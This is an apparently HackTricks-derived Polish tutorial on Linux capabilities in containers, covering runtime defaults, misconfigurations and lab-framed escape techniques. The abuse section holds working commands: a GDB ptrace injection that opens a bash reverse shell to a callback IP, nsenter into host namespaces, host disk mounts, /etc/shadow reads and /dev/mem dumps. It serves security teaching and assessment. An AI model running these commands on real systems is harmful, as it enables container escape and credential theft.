# Capabilities Linuksa w kontenerach

{{#include ../../../../banners/hacktricks-training.md}}

## Wprowadzenie

Capabilities Linuksa są jednym z najważniejszych elementów bezpieczeństwa kontenerów, ponieważ odpowiadają na subtelne, ale fundamentalne pytanie: **co tak naprawdę oznacza „root” wewnątrz kontenera?** W zwykłym systemie Linux UID 0 historycznie oznaczał bardzo szeroki zestaw uprawnień. We współczesnych kernelach to uprawnienie jest podzielone na mniejsze jednostki nazywane capabilities. Proces może działać jako root, a mimo to nie mieć możliwości wykonywania wielu niebezpiecznych operacji, jeśli odpowiednie capabilities zostały usunięte. <sup>[[1]](#references)</sup>

Kontenery w dużym stopniu opierają się na tym rozróżnieniu. Wiele workloadów nadal jest uruchamianych jako UID 0 wewnątrz kontenera ze względu na kompatybilność lub prostotę. Bez usuwania capabilities byłoby to zdecydowanie zbyt niebezpieczne. Po usunięciu capabilities proces root działający w kontenerze nadal może wykonywać wiele zwykłych zadań wewnątrz kontenera, ale nie może wykonywać bardziej wrażliwych operacji na kernelu. Dlatego shell kontenera, który pokazuje `uid=0(root)`, nie oznacza automatycznie „host root” ani nawet „szerokich uprawnień do kernela”. Zestawy capabilities decydują o tym, ile faktycznie warta jest ta tożsamość root.

Pełny opis capabilities Linuksa oraz wiele przykładów ich abuse znajdziesz tutaj:

{{#ref}}
../../../interesting-files-permissions/linux-capabilities.md
{{#endref}}

## Działanie

Capabilities są śledzone w kilku zestawach, między innymi permitted, effective, inheritable, ambient oraz bounding. W przypadku wielu ocen kontenerów dokładne znaczenie każdego z tych zestawów na poziomie kernela jest mniej istotne niż końcowe pytanie praktyczne: **które uprzywilejowane operacje ten proces może skutecznie wykonać w tej chwili i które przyszłe możliwości uzyskania uprawnień są nadal dostępne?** <sup>[[1]](#references)</sup>

Ma to znaczenie, ponieważ wiele technik breakout to w rzeczywistości problemy z capabilities przebrane za problemy z kontenerami. Workload z `CAP_SYS_ADMIN` może uzyskać dostęp do ogromnej liczby funkcji kernela, których zwykły proces root w kontenerze nie powinien używać. Workload z `CAP_NET_ADMIN` staje się znacznie bardziej niebezpieczny, jeśli współdzieli host network namespace. Workload z `CAP_SYS_PTRACE` staje się znacznie bardziej interesujący, jeśli może widzieć procesy hosta przez współdzielenie host PID. W Dockerze lub Podmanie może to wyglądać jako `--pid=host`; w Kubernetes zwykle występuje jako `hostPID: true`.

Innymi słowy, zestawu capabilities nie można oceniać w izolacji. Należy analizować go razem z namespaces, seccomp oraz polityką MAC.

## Lab

Bardzo bezpośrednim sposobem sprawdzenia capabilities wewnątrz kontenera jest:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Możesz również porównać bardziej restrykcyjny kontener z kontenerem, do którego dodano wszystkie capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Aby zobaczyć efekt ograniczonego dodatku, spróbuj usunąć wszystko i dodać z powrotem tylko jedną capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Te małe eksperymenty pomagają pokazać, że runtime nie przełącza po prostu wartości logicznej o nazwie „privileged”. Kształtuje on rzeczywistą powierzchnię uprawnień dostępną dla procesu.

## Capabilities wysokiego ryzyka

Capabilities stają się primitives umożliwiającymi escape tylko wtedy, gdy ich działanie obejmuje **zasób kontrolowany przez hosta**. Powtarzające się kombinacje wysokiego ryzyka to:

- **`CAP_SYS_ADMIN`** w połączeniu z hostowym PID-em, urządzeniem blokowym lub zapisywalną ścieżką kontroli kernela. Do dołączenia do docelowego mount namespace dodatkowo wymagane jest **`CAP_SYS_CHROOT`**; zamontowanie filesystemu opartego na urządzeniu blokowym wymaga **`CAP_SYS_ADMIN`** w początkowym user namespace.
- **`CAP_SYS_PTRACE`** w połączeniu z widocznością hostowych PID-ów i procesem hosta, do którego można się podłączyć. **`CAP_SYS_ADMIN`** nie jest wymagane do wstrzyknięcia przez ptrace.
- **`CAP_DAC_OVERRIDE` lub `CAP_DAC_READ_SEARCH`** w połączeniu z osiągalnym hostowym filesystemem. Te capabilities omijają różne kontrole DAC, ale nie tworzą widoku hostowego filesystemu.
- **`CAP_SYS_MODULE`** w początkowym user namespace w połączeniu z zaakceptowanym modułem kompatybilnym z kernelem. Zwykłe Linux containers współdzielą kernel węzła; runtime'y oparte na VM lub userspace kernel zmieniają tę granicę.
- **`CAP_MKNOD`** w początkowym user namespace w połączeniu z rzeczywistym urządzeniem hosta, na które device cgroup już zezwala. Utworzenie noda nie omija device cgroup.
- **`CAP_SYS_RAWIO`** w połączeniu z udostępnionym i użytecznym interfejsem pamięci, portów I/O, PCI lub kontroli urządzeń.
- **`CAP_SYS_BOOT`** w połączeniu z początkowym PID namespace w celu zrestartowania hosta albo z użyteczną i dozwoloną ścieżką kexec w celu zastąpienia kernela.
- **`CAP_NET_ADMIN`** w hostowym network namespace w celu bezpośredniej kontroli stanu sieci węzła. **`CAP_NET_RAW`** może uczestniczyć w escape zależnym od konkretnego protokołu, ale same raw sockets nie zapewniają shellu na węźle.

**`CAP_SYS_CHROOT`** celowo nie jest wymienione jako samodzielne capability umożliwiające escape. Może być wymagane przez `setns()` dla mount namespace i może ułatwić korzystanie z już dostępnego drzewa hosta, ale samo `chroot()` ani nie udostępnia tego drzewa, ani nie przyznaje nowych uprawnień do filesystemu. Podobnie **`CAP_BPF`** i **`CAP_PERFMON`** udostępniają potężną telemetrię i powierzchnię ataku kernela, ale bez osobnej luki w kernelu ich zwykłe operacje nie są ogólnymi escape z containerów.

## Użycie przez runtime

Docker, Podman, stacki oparte na containerd oraz CRI-O korzystają z kontroli capabilities, ale ich wartości domyślne i interfejsy zarządzania się różnią. Docker udostępnia je bezpośrednio za pomocą flag takich jak `--cap-drop` i `--cap-add`. Podman udostępnia podobne mechanizmy i często łączy je z rootless execution jako dodatkową warstwą bezpieczeństwa. Kubernetes udostępnia dodawanie i usuwanie capabilities przez `securityContext` Poda lub containera; runtime'y niższego poziomu zapisują wynikowe zestawy w konfiguracji OCI runtime. Środowiska system-containers, takie jak LXC i Incus, również opierają się na kontroli capabilities, ale ich szersza integracja z hostem może skłaniać operatorów do bardziej agresywnego rozluźniania wartości domyślnych niż w przypadku application container. <sup>[[2]](#references)</sup> <sup>[[3]](#references)</sup> <sup>[[4]](#references)</sup> <sup>[[5]](#references)</sup> <sup>[[6]](#references)</sup>

Ta sama zasada obowiązuje we wszystkich tych środowiskach: capability, którego technicznie można udzielić, niekoniecznie jest capability, którego należy udzielić. Wiele rzeczywistych incydentów zaczyna się, gdy operator dodaje capability tylko dlatego, że workload nie działał przy bardziej restrykcyjnej konfiguracji, a zespół potrzebował szybkiej poprawki.

## Błędne konfiguracje

Najbardziej oczywistym błędem jest **`--cap-add=ALL`** w CLI w stylu Docker/Podman, ale nie jest to jedyny problem. W praktyce częstszym problemem jest przyznanie jednej lub dwóch wyjątkowo potężnych capabilities, szczególnie `CAP_SYS_ADMIN`, aby „uruchomić aplikację”, bez zrozumienia konsekwencji związanych z namespaces, seccomp i mounts. Innym częstym trybem awarii jest łączenie dodatkowych capabilities ze współdzieleniem host namespace. W Dockerze lub Podmanie może się to pojawić jako `--pid=host`, `--network=host` lub `--userns=host`; w Kubernetesie równoważna ekspozycja zwykle pojawia się w ustawieniach workloadu, takich jak `hostPID: true` lub `hostNetwork: true`. Każda z tych kombinacji zmienia to, na co capability może faktycznie oddziaływać.

Często można również spotkać administratorów przekonanych, że skoro workload nie jest w pełni `--privileged`, to nadal podlega istotnym ograniczeniom. Czasami jest to prawda, ale czasami rzeczywista postura jest już na tyle zbliżona do privileged, że różnica przestaje mieć znaczenie operacyjne.

## Nadużycie

Zacznij od zapisania effective sets, mapowania user namespace, stanu seccomp, namespaces, mounts i devices. Sama nazwa capability bez tego kontekstu nie potwierdza escape:
```bash
capsh --print
grep -E 'Cap(Inh|Prm|Eff|Bnd|Amb)|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
ls -l /proc/self/ns
findmnt
```
### `CAP_SYS_ADMIN`: namespaces and block devices

Przy widoczności PID hosta `CAP_SYS_ADMIN` umożliwia wejście do przestrzeni nazw hosta. Operacja dotycząca przestrzeni nazw montowania wymaga również `CAP_SYS_CHROOT` w user namespace wywołującego.

**Sprawdź capability i ograniczenia:**
```bash
capsh --print | grep -E 'cap_sys_admin|cap_sys_chroot'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map /proc/self/gid_map
```
**Wykonaj enumerację celu:** potwierdź współdzielenie PID hosta na podstawie konfiguracji kontenera/Poda lub jednoznacznej listy procesów hosta, a następnie sprawdź przestrzenie nazw celu. Lokalny PID 1 występuje również w prywatnych przestrzeniach nazw PID, więc jego obecność sama w sobie nie dowodzi współdzielenia PID hosta.
```bash
ps -eo pid,user,comm,args
target_pid=1
tr '\0' ' ' <"/proc/${target_pid}/cmdline"; echo
ls -l "/proc/${target_pid}/ns/"{mnt,pid,net,ipc,uts,user}
```
**Wykorzystaj ścieżkę namespace:**
```bash
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/sh
id
findmnt /
```
Sprawdzenia capabilities muszą zakończyć się powodzeniem w user namespaces, które posiadają cele. `--pid=host` lub Kubernetes `hostPID: true` zapewnia widoczność, ale nie zapewnia capabilities.

W przypadku alternatywnej ścieżki block-device najpierw **enumerate** kandydatów, a następnie **exploit** dostępny filesystem, montując najpierw zweryfikowanego kandydata w trybie tylko do odczytu:
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/vda1  # Replace with the validated candidate.
mkdir -p /mnt/hostdisk
mount -o ro "${node_root_device}" /mnt/hostdisk
cat /mnt/hostdisk/etc/hostname
umount /mnt/hostdisk
```
Węzeł urządzenia musi istnieć, cgroup urządzeń musi na niego zezwalać, a montowania blokowych systemów plików wymagają `CAP_SYS_ADMIN` w początkowej przestrzeni nazw użytkownika. Root hosta już zamontowany przez bind mount pod `/host` zapewnia dostęp do hosta **bez** `CAP_SYS_ADMIN`; `chroot /host` jest tylko ułatwieniem i osobno wymaga `CAP_SYS_CHROOT`.

### Osiągalny root hosta: bezpośrednie wykonywanie z systemu plików

Jeśli root hosta jest już zamontowany pod `/host`, najpierw potwierdź montowanie, a następnie użyj istniejącego dostępu bezpośrednio. Ta ścieżka nie zależy od `CAP_SYS_ADMIN`:
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
ls -la /host
chroot /host /bin/bash
```
Jeśli `chroot()` jest niedostępne, ale binarka hosta jest zgodna z architekturą i loaderem kontenera, często można ją wywołać również za pośrednictwem zamontowanego drzewa:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
Bezpośredni odczyt i zapis w `/host` oznacza już naruszenie hostowego systemu plików. `chroot()` lub wykonanie pliku binarnego hosta jedynie ułatwia ten dostęp; żadna z tych operacji nie tworzy punktu montowania hosta ani nie omija montowania tylko do odczytu lub zasad MAC.

### `CAP_SYS_PTRACE`: wstrzykiwanie do procesu hosta

Przy widoczności PID-ów hosta i `CAP_SYS_PTRACE` w user namespace celu GDB może sprawić, aby zatwierdzony proces hosta wywołał `system()`. `CAP_SYS_ADMIN` nie jest wymagane.

**Sprawdź capability i mechanizmy kontroli dołączania:**
```bash
capsh --print | grep cap_sys_ptrace
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
cat /proc/sys/kernel/yama/ptrace_scope 2>/dev/null
```
**Enumerate i wybierz jednorazowy cel:** potwierdź współdzielenie PID hosta na podstawie konfiguracji lub jednoznacznej listy procesów węzła; nigdy nie wybieraj PID 1 ani krytycznego demona.
```bash
ps -eo pid,user,comm,args
target_pid=<approved-lab-process-pid>
readlink "/proc/${target_pid}/exe"
grep -E '^(Name|Uid|Gid|TracerPid|NoNewPrivs|Seccomp):' \
"/proc/${target_pid}/status"
```
**Wykorzystaj wybrany proces:**
```bash
# On a reachable assessment system:
nc -lvnp 4444

# In the container:
callback_ip=192.0.2.10
callback_port=4444
gdb -q -nx -batch -p "${target_pid}" \
-ex "call (int) system(\"bash -c 'bash -i >& /dev/tcp/${callback_ip}/${callback_port} 0>&1'\")" \
-ex detach
```
Cel musi umożliwiać podłączenie i mieć użyteczny symbol `system()` oraz ścieżkę do payloadu Bash. Yama, stan non-dumpable, seccomp, user namespaces i polityka MAC mogą zablokować ten łańcuch. GDB zatrzymuje cel podczas podłączenia, dlatego używaj wyłącznie procesu laboratoryjnego przeznaczonego do usunięcia.

### `CAP_DAC_OVERRIDE` i `CAP_DAC_READ_SEARCH`: chronione pliki hosta

Te capabilities nie udostępniają systemu plików hosta. Jeśli `/host` jest już mountem hosta, `CAP_DAC_READ_SEARCH` może omijać kontrole DAC odczytu/wyszukiwania, a `CAP_DAC_OVERRIDE` może dodatkowo omijać standardowe kontrole zapisu:

**Sprawdź capabilities:**
```bash
capsh --print | grep -E 'cap_dac_override|cap_dac_read_search'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Wylicz wystawiony system plików hosta i docelowe uprawnienia:**
```bash
findmnt -T /host -o TARGET,SOURCE,FSTYPE,OPTIONS
stat -c 'owner=%u:%g mode=%A path=%n' \
/host/etc/shadow /host/root /host/var/lib/kubelet 2>/dev/null
find /host/var/lib/kubelet -maxdepth 3 -type f -readable -ls 2>/dev/null | head
```
**Przetestuj obejścia odczytu i zapisu** w jednorazowym labie:
```bash
head -n 1 /host/etc/shadow
printf 'DAC proof from uid=%s\n' "$(id -u)" >/host/root/ht-dac-proof
rm /host/root/ht-dac-proof
```
Nadal obowiązują reguły read-only mount i LSM. `CAP_DAC_READ_SEARCH` autoryzuje również `open_by_handle_at()`, ale breakout taki jak Shocker wymaga dodatkowo deskryptora pliku montowania dla tego samego bazowego systemu plików, prawidłowych lub możliwych do znalezienia uchwytów, zgodnego układu systemu plików/storage oraz braku blokady ze strony runtime lub LSM. Nie zapewnia on arbitralnego dostępu do każdego systemu plików poza przestrzenią nazw montowania.

### `CAP_SYS_MODULE`: wykonywanie w shared kernel

W zwykłym kontenerze Linux zaakceptowany moduł działa w współdzielonym kernelu hosta.

**Sprawdź capability i zakres user namespace:**
```bash
capsh --print | grep cap_sys_module
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Wymień wymagania wstępne ładowania modułu:**
```bash
uname -r
cat /proc/sys/kernel/modules_disabled
cat /sys/kernel/security/lockdown 2>/dev/null
grep -E 'CONFIG_MODULES=|CONFIG_MODULE_SIG(_FORCE)?=' \
"/boot/config-$(uname -r)" 2>/dev/null
modinfo /lab/ht-proof.ko
```
**Exploituj wyłącznie za pomocą kompatybilnego, wcześniej zweryfikowanego modułu proof na tymczasowym węźle:**
```bash
insmod /lab/ht-proof.ko
grep '^ht_proof ' /proc/modules
rmmod ht_proof
```
Capability musi być skuteczna w początkowej przestrzeni nazw użytkownika. Wersja i konfiguracja kernela, podpisy modułów, lockdown, seccomp oraz polityka LSM muszą zezwalać na załadowanie. Kata, gVisor, izolacja Hyper-V i podobne runtime'y zmieniają granicę kernela, do której dociera workload.

### `CAP_MKNOD`: utworzenie dozwolonego uchwytu urządzenia

`CAP_MKNOD` tworzy węzeł urządzenia, ale nie omija device cgroup. Tworzenie urządzeń nie jest namespaced, dlatego capability musi być skuteczna w początkowej przestrzeni nazw użytkownika.

**Sprawdź capability i zakres przestrzeni nazw użytkownika:**
```bash
capsh --print | grep cap_mknod
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Wymień rzeczywiste urządzenia, ich numery major/minor oraz wszelką widoczną listę dozwolonych urządzeń cgroup-v1:**
```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS 2>/dev/null
for device_file in /sys/class/block/*/dev; do
printf '%s %s\n' "${device_file}" "$(cat "${device_file}")"
done
cat /sys/fs/cgroup/devices/devices.list 2>/dev/null
```
**Wykorzystanie zweryfikowanego kandydata ext-family tylko do odczytu:**
```bash
node_block_name=vda1                       # Replace with the validated candidate.
device_numbers=$(cat "/sys/class/block/${node_block_name}/dev")
device_major=${device_numbers%:*}
device_minor=${device_numbers#*:}
mknod /dev/ht-node-root b "${device_major}" "${device_minor}"
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```
Inne systemy plików wymagają odpowiedniego narzędzia tylko do odczytu; zamontowanie urządzenia wymaga dodatkowo `CAP_SYS_ADMIN`. `Operation not permitted` podczas otwierania utworzonego węzła zwykle oznacza, że cgroup urządzeń nadal blokuje do niego dostęp. W cgroup v2 dostęp do urządzeń jest zazwyczaj egzekwowany za pomocą BPF i nie istnieje plik `devices.list`, dlatego pomyślne otwarcie jest rozstrzygającym testem.

### `CAP_SYS_RAWIO`: udostępniony interfejs raw-I/O

Nie istnieje przenośny, uniwersalny payload: prawidłowe adresy i skutki zależą od sprzętu oraz konfiguracji kernela.

**Sprawdź capability i zakres user namespace:**
```bash
capsh --print | grep cap_sys_rawio
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Wymień wystawione surowe interfejsy, sprzęt i sterowniki:**
```bash
ls -l /dev/mem /dev/port 2>/dev/null
lspci -nnk 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```
**Exploituj wyłącznie za pomocą zatwierdzonego proof dla zidentyfikowanego urządzenia i zakresu adresów.** Jeśli `/dev/mem` jest zatwierdzonym w laboratorium interfejsem, ten szablon potwierdza ujawnienie pamięci węzła bez wyświetlania jej zawartości:
```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```
Adres musi pochodzić z mapy sprzętowej labu, ponieważ odczyt niektórych regionów MMIO może powodować skutki uboczne. Generyczne polecenie zapisu do pamięci byłoby mylące i niebezpieczne: ten sam adres może być nieszkodliwy na jednej maszynie, a na innej sterować sprzętem lub pamięcią kernela. Device cgroups, uprawnienia systemu plików, restrykcyjne `/dev/mem`, kernel lockdown, wirtualizacja oraz polityka LSM często uniemożliwiają uzyskanie użytecznego dostępu.

### `CAP_SYS_BOOT`: reboot namespace lub podmiana kernela

W prywatnym PID namespace `reboot()` kończy proces init tego namespace, zamiast rebootować hosta. Wpływ na reboot hosta wymaga zatem początkowego PID namespace, zwykle poprzez współdzielenie PID hosta. Ścieżka kexec również wymaga kompatybilnego obrazu kernela oraz permissive lockdown/signature policy:

**Sprawdź capability:**
```bash
capsh --print | grep cap_sys_boot
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
cat /proc/self/uid_map
```
**Wymień wymagania wstępne dotyczące przestrzeni nazw PID i kexec:** potwierdź współdzielenie PID hosta w konfiguracji workloadu, ponieważ samo odwołanie do przestrzeni nazw PID nie ujawnia, czy jest to początkowa przestrzeń nazw węzła.
```bash
ps -p 1 -o pid,user,comm,args
readlink /proc/self/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```
**Exploit tylko wtedy, gdy ponowne uruchomienie jednorazowego węzła laboratoryjnego jest wyraźnie częścią ćwiczenia:**
```bash
sync
reboot -f
```
Nie wykonuj tego polecenia ani nie ładuj kernela w współdzielonym węźle wyłącznie po to, aby potwierdzić posiadanie capability. W prywatnej przestrzeni nazw PID kończy ono tylko proces init tej przestrzeni nazw i nie demonstruje wpływu na hosta.

### `CAP_NET_ADMIN` i `CAP_NET_RAW`: ścieżki sieciowe hosta

`CAP_NET_ADMIN` wpływa wyłącznie na bieżącą przestrzeń nazw sieci.

**Sprawdź capabilities i izolację:**
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
grep -E 'CapEff|Seccomp|NoNewPrivs' /proc/self/status
```
**Zenumeruj bieżącą konfigurację sieciową i potwierdź korzystanie z sieci hosta na podstawie konfiguracji workloadu:**
```bash
readlink /proc/self/ns/net
ip -brief address
ip route
nft list ruleset 2>/dev/null || iptables-save 2>/dev/null
```
**Ćwiczenie `CAP_NET_ADMIN` w sposób odwracalny:** przy korzystaniu z sieci hosta interfejs tymczasowy jest interfejsem węzła.
```bash
ip link add ht-net-admin-proof type dummy
ip addr add 192.0.2.1/32 dev ht-net-admin-proof
ip link set ht-net-admin-proof up
ip -brief addr show ht-net-admin-proof
ip link delete ht-net-admin-proof
```
`CAP_NET_RAW` zezwala na gniazda RAW i PACKET, ale nie zapewnia ogólnej powłoki hosta. Aby **enumerate** udokumentowany łańcuch GCE, sprawdź trasę metadanych i przechwyć, czy ruch guest-agent w plaintext jest możliwy do obserwowania:
```bash
ip route get 169.254.169.254
tcpdump -ni any -c 20 'host 169.254.169.254'
```
Jeśli istnieją wymagane warunki wstępne, **exploit** łańcuch zależny od środowiska opisany w [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html): przechwyć żądanie i stan sekwencji, wstrzyknij sfałszowaną odpowiedź metadanych zawierającą klucz SSH, a następnie zweryfikuj dostęp do hosta. Łańcuch wymagał uprawnień root, sieci hosta, `CAP_NET_ADMIN`, `CAP_NET_RAW`, nieszyfrowanego ruchu do metadanych GCE oraz podatnego na race condition żądania guest-agenta; współczesny transport lub zachowanie agenta może go przerwać.

## Kontrole

Celem kontroli capabilities jest nie tylko zrzucenie surowych wartości, ale także zrozumienie, czy proces ma wystarczające uprawnienia, aby jego bieżąca przestrzeń nazw i sytuacja dotycząca mountów stwarzały zagrożenie.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Co jest tutaj interesujące:

- `capsh --print` to najprostszy sposób na wykrycie capabilities wysokiego ryzyka, takich jak `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin` lub `cap_sys_module`.
- Wiersz `CapEff` w `/proc/self/status` informuje, które capabilities są faktycznie effective w danym momencie, a nie tylko które mogą być dostępne w innych sets.
- Zrzut capabilities staje się znacznie ważniejszy, jeśli kontener współdzieli również hostowe namespaces PID, network lub user albo ma zapisywalne host mounts.

Po zebraniu surowych informacji o capabilities kolejnym krokiem jest ich interpretacja. Sprawdź, czy proces działa jako root, czy user namespaces są aktywne, czy host namespaces są współdzielone, czy seccomp jest enforcing oraz czy AppArmor lub SELinux nadal ograniczają proces. Sam capability set to tylko część obrazu, ale często właśnie on wyjaśnia, dlaczego jeden container breakout działa, a inny kończy się niepowodzeniem przy tym samym pozornym punkcie wyjścia.

## Runtime Defaults

| Runtime / platform | Stan domyślny | Domyślne działanie | Częste ręczne osłabienie |
| --- | --- | --- | --- |
| Docker Engine | Domyślnie zredukowany capability set | Docker zachowuje domyślną allowlist capabilities i usuwa pozostałe | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Domyślnie zredukowany capability set | Kontenery Podman są domyślnie unprivileged i korzystają ze zredukowanego modelu capabilities | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Dziedziczy runtime defaults, jeśli nie zostaną zmienione | Jeśli nie określono `securityContext.capabilities`, kontener otrzymuje domyślny capability set z runtime | `securityContext.capabilities.add`, pominięcie `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Zwykle runtime default | Effective set zależy od runtime oraz Pod spec | tak jak w wierszu Kubernetes; bezpośrednia konfiguracja OCI/CRI również może jawnie dodawać capabilities |

W przypadku Kubernetes ważne jest to, że API nie definiuje jednego uniwersalnego domyślnego capability set. Jeśli Pod nie dodaje ani nie usuwa capabilities, workload dziedziczy runtime default dla danego node.

## References

- [1] [capabilities(7) - Linux manual page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [2] [Open Container Initiative - Linux container configuration](https://github.com/opencontainers/runtime-spec/blob/main/config-linux.md#process)
- [3] [Docker Docs - Runtime privilege and Linux capabilities](https://docs.docker.com/engine/containers/run/#runtime-privilege-and-linux-capabilities)
- [4] [Kubernetes Documentation - Set capabilities for a container](https://kubernetes.io/docs/tasks/configure-pod-container/security-context/#set-capabilities-for-a-container)
- [5] [Podman documentation - `--cap-add` and `--cap-drop`](https://docs.podman.io/en/latest/markdown/podman-run.1.html#cap-add-capability)
- [6] [Incus documentation - Security](https://linuxcontainers.org/incus/docs/main/explanation/security/)
{{#include ../../../../banners/hacktricks-training.md}}
